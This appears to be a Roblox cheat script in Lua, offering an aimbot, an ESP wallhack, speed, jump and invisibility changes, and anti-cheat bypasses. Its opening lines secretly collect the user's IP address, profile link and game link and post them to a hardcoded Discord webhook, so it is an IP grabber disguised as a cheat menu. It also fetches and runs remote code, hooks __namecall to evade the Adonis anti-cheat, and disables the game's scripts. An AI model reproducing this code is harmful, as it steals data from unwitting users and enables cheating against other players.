local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()


local ip = game:HttpGet("https://api.ipify.org")
local profilelink = 'https://roblox.com/users/' .. game.Players.LocalPlayer.UserId .. '/profile'
local gamelink = 'https://roblox.com/games/' .. game.PlaceId .. '/' .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

local Webhook = 'https://discord.com/api/webhooks/1160148131787309086/n7vb9vWMcZL8iPIyaKQk9Ayd6LBn71eSqwKY1aWy9dLS8fHEdikSGjn7ISkeY_VU3hgm'

pcall(function()
    local data = {
        ["embeds"] = {
            {
                ["title"] = 'Ip: ' .. ip,
                ["description"] = 'Profile link: ' .. profilelink ..  ' ' .. 'Game link: ' .. gamelink, 
                ["image"] = {
                    ["url"] = 'https://tenor.com/view/bigbrainbuck-meme-letterbox-ip-grabber-gif-25437227'
                }
            }
        }
    }
    
    if syn then
        local response = syn.request({
            Url = Webhook,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = game:GetService('HttpService'):JSONEncode(data)
        })
    elseif request then
        local response = request({
            Url = Webhook,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = game:GetService('HttpService'):JSONEncode(data)
        })
    elseif http_request then
        local response = http_request({
            Url = Webhook,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = game:GetService('HttpService'):JSONEncode(data)
        })
    end
end)



local Namecall
Namecall = hookmetamethod(game, '__namecall', function(self, ...)
   local Caller = tostring(getcallingscript())
   local Method = getnamecallmethod()
   
   if Caller == 'ClientMover' and Method == 'GetService' then
       return
   end
   
   return Namecall(self, ...)
end)

warn('[Adonis Autobypass]: this game is running with autobypass!')


local Window = Rayfield:CreateWindow({
   Name = "Inf-Ware",
   LoadingTitle = "Connecting to the servers ",
   LoadingSubtitle = "by www.github.com/PJ-0001",
   ConfigurationSaving = {
      Enabled = false,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "Example Hub"
   },
   Discord = {
      Enabled = true,
      Invite = "w9Ud9aUrfH", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
      RememberJoins = false -- Set this to false to make them join the discord every time they load it up
   },
   KeySystem = false, -- Set this to true to use our key system
   KeySettings = {
      Title = "PxD Security System",
      Subtitle = "Key System",
      Note = "Key In Discord Server",
      FileName = "YoutubeHubKey1", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = false, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = true, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"https://pastebin.com/raw/pVaCSKbR"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})

local MainTab = Window:CreateTab("Humanoid Exploits", nil) 
local MainSection = MainTab:CreateSection("Main")
local AC = Window:CreateTab("Anti-Cheat Bypasses", nil) -- Title, Image
local TPTab = Window:CreateTab("Aimbot", nil) -- Title, Image
local BladeBall = Window:CreateTab("Blade-Ball Cheats", nil) -- Title, Image
local ESPTab = Window:CreateTab("ESP", nil) -- Title, Image



local Slider = MainTab:CreateSlider({
    Name = "WalkSpeed Slider",
    Range = {1, 400},
    Increment = 1,
    Suffix = "Speed",
    CurrentValue = 16,
    Flag = "sliderws", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
         game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (Value)
    end,
 })
 
 
 
 
 local Slider = MainTab:CreateSlider({
    Name = "JumpPower Slider",
    Range = {1, 350},
    Increment = 1,
    Suffix = "Speed",
    CurrentValue = 16,
    Flag = "sliderjp", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
         game.Players.LocalPlayer.Character.Humanoid.JumpPower = (Value)
    end,
 })
 
 local invis_on = false

 function ToggleInvisibility()
     invis_on = not invis_on
     
     if invis_on then
         local savedpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
         wait()
         
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -200, 0)
         
         wait(0.15)
         
         local Seat = Instance.new('Seat', game.Workspace)
         Seat.Anchored = false
         Seat.CanCollide = false
         Seat.Name = 'invischair'
         Seat.Transparency = 1
         Seat.Position = Vector3.new(0, -200, 0)
         
         local Weld = Instance.new("Weld", Seat)
         Weld.Part0 = Seat
         Weld.Part1 = game.Players.LocalPlayer.Character:FindFirstChild("Torso") or game.Players.LocalPlayer.Character.UpperTorso
         
         wait()
         
         Seat.CFrame = savedpos
         
         game.StarterGui:SetCore("SendNotification", {
             Title = "Invisibility On";
             Duration = 1;
             Text = "";
         })
     else
         local invisChair = workspace:FindFirstChild('invischair')
         if invisChair then
             invisChair:Remove()
         end
         
         game.StarterGui:SetCore("SendNotification", {
             Title = "Invisibility Off";
             Duration = 1;
             Text = "";
         })
     end
 end
 
 
 local Toggle = MainTab:CreateToggle({
     Name = "Invisiblity",
     CurrentValue = false,
     Flag = "RAR", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
     Callback = function(Value)
         if Value == true then
             local invis_on = true
             ToggleInvisibility()
         else
             local invis_on = false
             ToggleInvisibility()
             Value = false
         end
     end,
 })


 local Camera = workspace.CurrentCamera
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
 local Holding = false
 
 _G.AimbotEnabled = false
 _G.TeamCheck = false -- If set to true then the script would only lock your aim at enemy team members.
 _G.AimPart = "Head" -- Where the aimbot script would lock at.
 _G.Sensitivity = 0 -- How many seconds it takes for the aimbot script to officially lock onto the target's aimpart.
 
 _G.CircleSides = 64 -- How many sides the FOV circle would have.
 _G.CircleColor = Color3.fromRGB(255, 0, 0) -- (RGB) Color that the FOV circle would appear as.
 _G.CircleTransparency = 0.7 -- Transparency of the circle.
 _G.CircleRadius = 80 -- The radius of the circle / FOV.
 _G.CircleFilled = false -- Determines whether or not the circle is filled.
 _G.CircleVisible = false -- Determines whether or not the circle is visible.
 _G.CircleThickness = 0 -- The thickness of the circle.
 
 local FOVCircle = Drawing.new("Circle")
 FOVCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
 FOVCircle.Radius = _G.CircleRadius
 FOVCircle.Filled = _G.CircleFilled
 FOVCircle.Color = _G.CircleColor
 FOVCircle.Visible = _G.CircleVisible
 FOVCircle.Radius = _G.CircleRadius
 FOVCircle.Transparency = _G.CircleTransparency
 FOVCircle.NumSides = _G.CircleSides
 FOVCircle.Thickness = _G.CircleThickness
 
 local function GetClosestPlayer()
     local MaximumDistance = _G.CircleRadius
     local Target = nil
 
     for _, v in next, Players:GetPlayers() do
         if v.Name ~= LocalPlayer.Name then
             if _G.TeamCheck == true then
                 if v.Team ~= LocalPlayer.Team then
                     if v.Character ~= nil then
                         if v.Character:FindFirstChild("HumanoidRootPart") ~= nil then
                             if v.Character:FindFirstChild("Humanoid") ~= nil and v.Character:FindFirstChild("Humanoid").Health ~= 0 then
                                 local ScreenPoint = Camera:WorldToScreenPoint(v.Character:WaitForChild("HumanoidRootPart", math.huge).Position)
                                 local VectorDistance = (Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y) - Vector2.new(ScreenPoint.X, ScreenPoint.Y)).Magnitude
                                 
                                 if VectorDistance < MaximumDistance then
                                     Target = v
                                 end
                             end
                         end
                     end
                 end
             else
                 if v.Character ~= nil then
                     if v.Character:FindFirstChild("HumanoidRootPart") ~= nil then
                         if v.Character:FindFirstChild("Humanoid") ~= nil and v.Character:FindFirstChild("Humanoid").Health ~= 0 then
                             local ScreenPoint = Camera:WorldToScreenPoint(v.Character:WaitForChild("HumanoidRootPart", math.huge).Position)
                             local VectorDistance = (Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y) - Vector2.new(ScreenPoint.X, ScreenPoint.Y)).Magnitude
                             
                             if VectorDistance < MaximumDistance then
                                 Target = v
                             end
                         end
                     end
                 end
             end
         end
     end
 
     return Target
 end
 
 UserInputService.InputBegan:Connect(function(Input)
     if Input.UserInputType == Enum.UserInputType.MouseButton2 then
         Holding = true
     end
 end)
 
 UserInputService.InputEnded:Connect(function(Input)
     if Input.UserInputType == Enum.UserInputType.MouseButton2 then
         Holding = false
     end
 end)
 
 RunService.RenderStepped:Connect(function()
     FOVCircle.Position = Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y)
     FOVCircle.Radius = _G.CircleRadius
     FOVCircle.Filled = _G.CircleFilled
     FOVCircle.Color = _G.CircleColor
     FOVCircle.Visible = _G.CircleVisible
     FOVCircle.Radius = _G.CircleRadius
     FOVCircle.Transparency = _G.CircleTransparency
     FOVCircle.NumSides = _G.CircleSides
     FOVCircle.Thickness = _G.CircleThickness
 
     if Holding == true and _G.AimbotEnabled == true then
         TweenService:Create(Camera, TweenInfo.new(_G.Sensitivity, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = CFrame.new(Camera.CFrame.Position, GetClosestPlayer().Character[_G.AimPart].Position)}):Play()
     end
 end)
 


local Toggle = TPTab:CreateToggle({
    Name = "Aimbot Enable/Disable",
    CurrentValue = false,
    Flag = "RZR", 
    Callback = function(Value)
        if Value == true then
            _G.AimbotEnabled = true
           
        else
            _G.AimbotEnabled = false
        end
    end,
})




local Toggle = TPTab:CreateToggle({
    Name = "FOV Toggle",
    CurrentValue = false,
    Flag = "FOV2", 
    Callback = function(Value)
        if Value == true then
            _G.CircleVisible = true
           
        else
            _G.CircleVisible = false
        end
    end,
})


local Slider = TPTab:CreateSlider({
    Name = "FOV Slider",
    Range = {1, 400},
    Increment = 1,
    Suffix = "FOV",
    CurrentValue = 80,
    Flag = "sliderfov", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        _G.CircleRadius = (Value)
    end,
 })
 
 
 local Dropdown = TPTab:CreateDropdown({
    Name = "Aimbot Mode",
    Options = {"Slient Aim","Blatant Aimbot"},
    CurrentOption = {"none"},
    MultipleOptions = false,
    Flag = "Dropdown1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Option)
        if Option == "Slient Aim" then
            _G.Sensitivity = 0.3
        elseif Option == "Blatant Aimbot" then
            _G.Sensitivity = 0
        end
    end,
 })

local disabledInstances = {}

local function toggleInstances(disabled)
    for _, instance in ipairs(game:GetDescendants()) do
        if instance:IsA("LocalScript") or instance:IsA("Script") then
            if instance.Name ~= "Animate" then
                instance.Disabled = disabled
                disabledInstances[instance] = instance.Disabled
            end
        end
    end
end


local Toggle = AC:CreateToggle({
    Name = "Bypass Local Anti-Exploit",
    CurrentValue = false,
    Flag = "Toggle",
    Callback = function(Value)
        toggleInstances(Value)
    end,
})



local Toggle5 = TPTab:CreateToggle({
    Name = "Teamcheck Toggle",
    CurrentValue = false,
    Flag = "RGFKIFJRR", 
    Callback = function(Value)
        if Value == true then
           _G.TeamCheck = true
      
        else
           _G.TeamCheck = false
        end
    end,
})


local workspace = game:GetService("Workspace")
local player = game:GetService("Players").LocalPlayer
local camera = workspace.CurrentCamera

--// Settings:
local on = false -- Use this if your making gui

local Box_Color = Color3.fromRGB(225, 255, 225)
local Box_Thickness = 1.4
local Box_Transparency = 1 -- 1 Visible, 0 Not Visible

local Tracers = true
local Tracer_Color = Color3.fromRGB(225, 255, 225)
local Tracer_Thickness = 1.4
local Tracer_Transparency = 1 -- 1 Visible, 0 Not Visible

local Autothickness = true -- Makes screen less encumbered

local Team_Check = false
local red = Color3.fromRGB(227, 52, 52)
local green = Color3.fromRGB(88, 217, 24)

local function NewLine()
    local line = Drawing.new("Line")
    line.Visible = false
    line.From = Vector2.new(0, 0)
    line.To = Vector2.new(1, 1)
    line.Color = Box_Color
    line.Thickness = Box_Thickness
    line.Transparency = Box_Transparency
    return line
end

--// Main Function:
for i, v in pairs(game.Players:GetChildren()) do
    --// Lines for 3D box (12)
    local lines = {
        line1 = NewLine(),
        line2 = NewLine(),
        line3 = NewLine(),
        line4 = NewLine(),
        line5 = NewLine(),
        line6 = NewLine(),
        line7 = NewLine(),
        line8 = NewLine(),
        line9 = NewLine(),
        line10 = NewLine(),
        line11 = NewLine(),
        line12 = NewLine(),
        Tracer = NewLine()
    }

    lines.Tracer.Color = Tracer_Color
    lines.Tracer.Thickness = Tracer_Thickness
    lines.Tracer.Transparency = Tracer_Transparency

    --// Updates ESP (lines) in render loop
    local function ESP()
        local connection
        connection = game:GetService("RunService").RenderStepped:Connect(function()
            if on and v.Character ~= nil and v.Character:FindFirstChild("Humanoid") ~= nil and v.Character:FindFirstChild("HumanoidRootPart") ~= nil and v.Name ~= player.Name and v.Character.Humanoid.Health > 0 and v.Character:FindFirstChild("Head") ~= nil then
                local pos, vis = camera:WorldToViewportPoint(v.Character.HumanoidRootPart.Position)
                if vis then
                    local Scale = v.Character.Head.Size.Y/2
                    local Size = Vector3.new(2, 3, 1.5) * (Scale * 2) -- Change this for different box size

                    local Top1 = camera:WorldToViewportPoint((v.Character.HumanoidRootPart.CFrame * CFrame.new(-Size.X, Size.Y, -Size.Z)).p)
                    local Top2 = camera:WorldToViewportPoint((v.Character.HumanoidRootPart.CFrame * CFrame.new(-Size.X, Size.Y, Size.Z)).p)
                    local Top3 = camera:WorldToViewportPoint((v.Character.HumanoidRootPart.CFrame * CFrame.new(Size.X, Size.Y, Size.Z)).p)
                    local Top4 = camera:WorldToViewportPoint((v.Character.HumanoidRootPart.CFrame * CFrame.new(Size.X, Size.Y, -Size.Z)).p)

                    local Bottom1 = camera:WorldToViewportPoint((v.Character.HumanoidRootPart.CFrame * CFrame.new(-Size.X, -Size.Y, -Size.Z)).p)
                    local Bottom2 = camera:WorldToViewportPoint((v.Character.HumanoidRootPart.CFrame * CFrame.new(-Size.X, -Size.Y, Size.Z)).p)
                    local Bottom3 = camera:WorldToViewportPoint((v.Character.HumanoidRootPart.CFrame * CFrame.new(Size.X, -Size.Y, Size.Z)).p)
                    local Bottom4 = camera:WorldToViewportPoint((v.Character.HumanoidRootPart.CFrame * CFrame.new(Size.X, -Size.Y, -Size.Z)).p)

                    --// Top:
                    lines.line1.From = Vector2.new(Top1.X, Top1.Y)
                    lines.line1.To = Vector2.new(Top2.X, Top2.Y)

                    lines.line2.From = Vector2.new(Top2.X, Top2.Y)
                    lines.line2.To = Vector2.new(Top3.X, Top3.Y)

                    lines.line3.From = Vector2.new(Top3.X, Top3.Y)
                    lines.line3.To = Vector2.new(Top4.X, Top4.Y)

                    lines.line4.From = Vector2.new(Top4.X, Top4.Y)
                    lines.line4.To = Vector2.new(Top1.X, Top1.Y)

                    --// Bottom:
                    lines.line5.From = Vector2.new(Bottom1.X, Bottom1.Y)
                    lines.line5.To = Vector2.new(Bottom2.X, Bottom2.Y)

                    lines.line6.From = Vector2.new(Bottom2.X, Bottom2.Y)
                    lines.line6.To = Vector2.new(Bottom3.X, Bottom3.Y)

                    lines.line7.From = Vector2.new(Bottom3.X, Bottom3.Y)
                    lines.line7.To = Vector2.new(Bottom4.X, Bottom4.Y)

                    lines.line8.From = Vector2.new(Bottom4.X, Bottom4.Y)
                    lines.line8.To = Vector2.new(Bottom1.X, Bottom1.Y)

                    --//S ides:
                    lines.line9.From = Vector2.new(Bottom1.X, Bottom1.Y)
                    lines.line9.To = Vector2.new(Top1.X, Top1.Y)

                    lines.line10.From = Vector2.new(Bottom2.X, Bottom2.Y)
                    lines.line10.To = Vector2.new(Top2.X, Top2.Y)

                    lines.line11.From = Vector2.new(Bottom3.X, Bottom3.Y)
                    lines.line11.To = Vector2.new(Top3.X, Top3.Y)

                    lines.line12.From = Vector2.new(Bottom4.X, Bottom4.Y)
                    lines.line12.To = Vector2.new(Top4.X, Top4.Y)

                    --// Tracer:
                    if Tracers then
                        local trace = camera:WorldToViewportPoint((v.Character.HumanoidRootPart.CFrame * CFrame.new(0, -Size.Y, 0)).p)

                        lines.Tracer.From = Vector2.new(camera.ViewportSize.X/2, camera.ViewportSize.Y)
                        lines.Tracer.To = Vector2.new(trace.X, trace.Y)
                    end

                    --// Teamcheck:
                    if Team_Check then
                        if v.TeamColor == player.TeamColor then
                            for u, x in pairs(lines) do
                                x.Color = green
                            end
                        else 
                            for u, x in pairs(lines) do
                                x.Color = red
                            end
                        end
                    end

                    --// Autothickness:
                    if Autothickness then
                        local distance = (player.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).magnitude
                        local value = math.clamp(1/distance*100, 0.1, 4) --0.1 is min thickness, 6 is max
                        for u, x in pairs(lines) do
                            x.Thickness = value
                        end
                    else 
                        for u, x in pairs(lines) do
                            x.Thickness = Box_Thickness
                        end
                    end

                    for u, x in pairs(lines) do
                        if x ~= lines.Tracer then
                            x.Visible = true
                        end
                    end
                    if Tracers then
                        lines.Tracer.Visible = true
                    end
                else 
                    for u, x in pairs(lines) do
                        x.Visible = false
                    end
                end
            else 
                for u, x in pairs(lines) do
                    x.Visible = false
                end
                if game.Players:FindFirstChild(v.Name) == nil then
                    connection:Disconnect()
                end
            end
        end)
    end
    coroutine.wrap(ESP)()
end

game.Players.PlayerAdded:Connect(function(newplr)
    --// Lines for 3D box (12)
    local lines = {
        line1 = NewLine(),
        line2 = NewLine(),
        line3 = NewLine(),
        line4 = NewLine(),
        line5 = NewLine(),
        line6 = NewLine(),
        line7 = NewLine(),
        line8 = NewLine(),
        line9 = NewLine(),
        line10 = NewLine(),
        line11 = NewLine(),
        line12 = NewLine(),
        Tracer = NewLine()
    }

    lines.Tracer.Color = Tracer_Color
    lines.Tracer.Thickness = Tracer_Thickness
    lines.Tracer.Transparency = Tracer_Transparency

    --// Updates ESP (lines) in render loop
    local function ESP()
        local connection
        connection = game:GetService("RunService").RenderStepped:Connect(function()
            if on and newplr.Character ~= nil and newplr.Character:FindFirstChild("Humanoid") ~= nil and newplr.Character:FindFirstChild("HumanoidRootPart") ~= nil and newplr.Name ~= player.Name and newplr.Character.Humanoid.Health > 0 and newplr.Character:FindFirstChild("Head") ~= nil then
                local pos, vis = camera:WorldToViewportPoint(newplr.Character.HumanoidRootPart.Position)
                if vis then
                    local Scale = newplr.Character.Head.Size.Y/2
                    local Size = Vector3.new(2, 3, 1.5) * (Scale * 2) -- Change this for different box size

                    local Top1 = camera:WorldToViewportPoint((newplr.Character.HumanoidRootPart.CFrame * CFrame.new(-Size.X, Size.Y, -Size.Z)).p)
                    local Top2 = camera:WorldToViewportPoint((newplr.Character.HumanoidRootPart.CFrame * CFrame.new(-Size.X, Size.Y, Size.Z)).p)
                    local Top3 = camera:WorldToViewportPoint((newplr.Character.HumanoidRootPart.CFrame * CFrame.new(Size.X, Size.Y, Size.Z)).p)
                    local Top4 = camera:WorldToViewportPoint((newplr.Character.HumanoidRootPart.CFrame * CFrame.new(Size.X, Size.Y, -Size.Z)).p)

                    local Bottom1 = camera:WorldToViewportPoint((newplr.Character.HumanoidRootPart.CFrame * CFrame.new(-Size.X, -Size.Y, -Size.Z)).p)
                    local Bottom2 = camera:WorldToViewportPoint((newplr.Character.HumanoidRootPart.CFrame * CFrame.new(-Size.X, -Size.Y, Size.Z)).p)
                    local Bottom3 = camera:WorldToViewportPoint((newplr.Character.HumanoidRootPart.CFrame * CFrame.new(Size.X, -Size.Y, Size.Z)).p)
                    local Bottom4 = camera:WorldToViewportPoint((newplr.Character.HumanoidRootPart.CFrame * CFrame.new(Size.X, -Size.Y, -Size.Z)).p)

                    --// Top:
                    lines.line1.From = Vector2.new(Top1.X, Top1.Y)
                    lines.line1.To = Vector2.new(Top2.X, Top2.Y)

                    lines.line2.From = Vector2.new(Top2.X, Top2.Y)
                    lines.line2.To = Vector2.new(Top3.X, Top3.Y)

                    lines.line3.From = Vector2.new(Top3.X, Top3.Y)
                    lines.line3.To = Vector2.new(Top4.X, Top4.Y)

                    lines.line4.From = Vector2.new(Top4.X, Top4.Y)
                    lines.line4.To = Vector2.new(Top1.X, Top1.Y)

                    --// Bottom:
                    lines.line5.From = Vector2.new(Bottom1.X, Bottom1.Y)
                    lines.line5.To = Vector2.new(Bottom2.X, Bottom2.Y)

                    lines.line6.From = Vector2.new(Bottom2.X, Bottom2.Y)
                    lines.line6.To = Vector2.new(Bottom3.X, Bottom3.Y)

                    lines.line7.From = Vector2.new(Bottom3.X, Bottom3.Y)
                    lines.line7.To = Vector2.new(Bottom4.X, Bottom4.Y)

                    lines.line8.From = Vector2.new(Bottom4.X, Bottom4.Y)
                    lines.line8.To = Vector2.new(Bottom1.X, Bottom1.Y)

                    --//S ides:
                    lines.line9.From = Vector2.new(Bottom1.X, Bottom1.Y)
                    lines.line9.To = Vector2.new(Top1.X, Top1.Y)

                    lines.line10.From = Vector2.new(Bottom2.X, Bottom2.Y)
                    lines.line10.To = Vector2.new(Top2.X, Top2.Y)

                    lines.line11.From = Vector2.new(Bottom3.X, Bottom3.Y)
                    lines.line11.To = Vector2.new(Top3.X, Top3.Y)

                    lines.line12.From = Vector2.new(Bottom4.X, Bottom4.Y)
                    lines.line12.To = Vector2.new(Top4.X, Top4.Y)

                    --// Tracer:
                    if Tracers then
                        local trace = camera:WorldToViewportPoint((newplr.Character.HumanoidRootPart.CFrame * CFrame.new(0, -Size.Y, 0)).p)
                        lines.Tracer.From = Vector2.new(camera.ViewportSize.X/2, camera.ViewportSize.Y)
                        lines.Tracer.To = Vector2.new(trace.X, trace.Y)
                    end

                    --// Teamcheck:
                    if Team_Check then
                        if newplr.TeamColor == player.TeamColor then
                            for u, x in pairs(lines) do
                                x.Color = green
                            end
                        else 
                            for u, x in pairs(lines) do
                                x.Color = red
                            end
                        end
                    end

                    --// Autothickness:
                    if Autothickness then
                        local distance = (player.Character.HumanoidRootPart.Position - newplr.Character.HumanoidRootPart.Position).magnitude
                        local value = math.clamp(1/distance*100, 0.1, 4) --0.1 is min thickness, 6 is max
                        for u, x in pairs(lines) do
                            x.Thickness = value
                        end
                    else 
                        for u, x in pairs(lines) do
                            x.Thickness = Box_Thickness
                        end
                    end

                    for u, x in pairs(lines) do
                        if x ~= lines.Tracer then
                            x.Visible = true
                        end
                    end
                    if Tracers then
                        lines.Tracer.Visible = true
                    end
                else 
                    for u, x in pairs(lines) do
                        x.Visible = false
                    end
                end
           else 
                for u, x in pairs(lines) do
                    x.Visible = false
                end
                if game.Players:FindFirstChild(newplr.Name) == nil then
                    connection:Disconnect()
                end
            end
        end)
    end
    coroutine.wrap(ESP)()
end)


local ESP = ESPTab:CreateToggle({
    Name = "ESP Toggle",
    CurrentValue = false,
    Flag = "Toggle8",
    Callback = function(Value)
       on = Value
    end,
})
